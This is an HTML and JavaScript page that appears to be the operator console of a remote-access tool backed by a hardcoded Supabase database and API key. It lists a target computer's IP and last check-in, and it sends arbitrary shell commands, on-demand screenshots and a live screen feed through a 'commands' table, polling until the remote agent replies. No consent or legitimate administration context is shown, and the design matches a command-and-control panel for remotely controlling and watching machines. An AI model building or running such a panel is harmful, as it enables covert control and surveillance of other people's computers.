<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Client</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-height:100vh}
.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:.8rem 1.5rem;display:flex;align-items:center;gap:1rem}
.back{color:#58a6ff;cursor:pointer;font-size:1.4rem;text-decoration:none;font-weight:700}
.back:hover{color:#79c0ff}
.topbar h1{color:#f0f6fc;font-size:1.1rem;flex:1}
.topbar .info{color:#8b949e;font-size:.85rem}
.main{padding:1rem 2rem}
.tabs{display:flex;gap:.5rem;margin-bottom:1rem}
.tab{background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:.5rem 1.2rem;cursor:pointer;font-size:.85rem;font-weight:600}
.tab.active{background:#1f6feb;color:#fff;border-color:#1f6feb}
.tab:hover{background:#30363d}
.tab.active:hover{background:#388bfd}
.panel{display:none}
.panel.active{display:block}
.cmd-input{width:100%;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.6rem;color:#c9d1d9;font-family:monospace;font-size:.85rem;margin-bottom:.5rem}
.cmd-input:focus{outline:none;border-color:#58a6ff}
.output{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:1rem;color:#c9d1d9;font-family:monospace;font-size:.85rem;min-height:400px;max-height:70vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.screenshot{max-width:100%;border-radius:8px;border:1px solid #30363d}
.loading{color:#484f58;text-align:center;padding:2rem;font-size:1rem}
.btn{border:none;padding:.45rem 1rem;border-radius:6px;cursor:pointer;font-size:.85rem;font-weight:600}
.btn-green{background:#238636;color:#fff}.btn-green:hover{background:#2ea043}
.btn-red{background:#da3633;color:#fff}.btn-red:hover{background:#f85149}
</style>
</head>
<body>
<div class="topbar">
  <a class="back" href="index.html">&larr;</a>
  <h1 id="name">-</h1>
  <div class="info" id="meta">-</div>
</div>
<div class="main">
  <div class="tabs">
    <div class="tab active" onclick="switchTab(this,'cmd')">CMD</div>
    <div class="tab" onclick="switchTab(this,'screenshot')">Screenshot</div>
    <div class="tab" onclick="switchTab(this,'screen')">Screen</div>
  </div>
  <div class="panel active" id="panel-cmd">
    <input class="cmd-input" id="cmdInput" placeholder="Type command and press Enter..." onkeydown="if(event.key==='Enter')runCmd()">
    <div class="output" id="cmdOutput">Ready.</div>
  </div>
  <div class="panel" id="panel-screenshot">
    <div style="display:flex;gap:.5rem;margin-bottom:1rem">
      <button class="btn btn-green" onclick="takeScreenshot()">Take Screenshot</button>
    </div>
    <div id="ssResult"><div class="loading">Click button to capture</div></div>
  </div>
  <div class="panel" id="panel-screen">
    <div style="display:flex;gap:.5rem;margin-bottom:1rem">
      <button class="btn btn-green" onclick="startScreen()">Start Live</button>
      <button class="btn btn-red" onclick="stopScreen()">Stop</button>
    </div>
    <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
  </div>
</div>
<script>
const SB='https://odocuexiouhmmkpwtuwk.supabase.co';
const KEY='sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED';
const H={headers:{apikey:KEY,Authorization:'Bearer '+KEY}};
const PH={headers:{apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json','Prefer':'return=representation'}};
const params=new URLSearchParams(window.location.search);
const computer=params.get('name')||'';
let screenInterval=null;
let pollLastTime=0;

document.getElementById('name').textContent=computer||'Unknown';
document.title=computer||'Client';

(async()=>{
 try{
  const r=await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(computer)+'&order=id.desc&limit=1',H);
  const p=await r.json();
  if(p.length)document.getElementById('meta').textContent='IP: '+(p[0].ip||'?')+' | Last: '+new Date(p[0].created_at).toLocaleString();
 }catch{}
})();

function switchTab(el,name){
 document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
 document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
 el.classList.add('active');
 document.getElementById('panel-'+name).classList.add('active');
}

async function sendAndWait(type,payload,el){
 el.innerHTML='<div class="loading">Sending...</div>';
 try{
  const r=await fetch(SB+'/rest/v1/commands',{method:'POST',headers:PH,body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
  const rows=await r.json();
  const cmdId=rows&&rows.length?rows[0].id:0;
  if(!cmdId){el.innerHTML='<div class="loading">Failed to send</div>';return null;}
  el.innerHTML='<div class="loading">Waiting for response...</div>';
  for(let i=0;i<60;i++){
   await new Promise(r=>setTimeout(r,1000));
   try{
    const r=await fetch(SB+'/rest/v1/commands?id=eq.'+cmdId,H);
    const rows=await r.json();
    if(rows.length&&rows[0].status==='done'){
     return rows[0];
    }
   }catch{}
  }
  el.innerHTML='<div class="loading">Timeout - no response</div>';
  return null;
 }catch(e){el.innerHTML='<div class="loading">Error: '+e.message+'</div>';return null;}
}

async function runCmd(){
 const input=document.getElementById('cmdInput');
 const cmd=input.value.trim();
 if(!cmd)return;
 const out=document.getElementById('cmdOutput');
 out.textContent+='> '+cmd+'\n';
 input.value='';
 const res=await sendAndWait('cmd',cmd,out);
 if(res){
  out.textContent+=(res.result||'(no output)')+'\n';
  out.scrollTop=out.scrollHeight;
 }
}

async function takeScreenshot(){
 const el=document.getElementById('ssResult');
 const res=await sendAndWait('screenshot','',el);
 if(res&&res.result){
  el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
 }else if(res){
  el.innerHTML='<div class="loading">Empty result received</div>';
 }
}

async function startScreen(){
 const el=document.getElementById('screenResult');
 screenInterval=setInterval(pollScreen,1500);
}

async function pollScreen(){
 const el=document.getElementById('screenResult');
 try{
  const r=await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screen&status=eq.done&order=id.desc&limit=1',H);
  const rows=await r.json();
  if(rows.length&&rows[0].result){
   const t=new Date(rows[0].created_at).getTime();
   if(Date.now()-t<15000){
    el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+rows[0].result+'">';
    pollLastTime=t;
   }else if(pollLastTime&&Date.now()-pollLastTime>10000){
    el.innerHTML='<div class="loading">Client disconnected</div>';
   }
  }else if(pollLastTime&&Date.now()-pollLastTime>10000){
   el.innerHTML='<div class="loading">Client disconnected</div>';
  }
 }catch{}
}

function stopScreen(){
 if(screenInterval){clearInterval(screenInterval);screenInterval=null}
 document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';
}
</script>
</body>
</html>
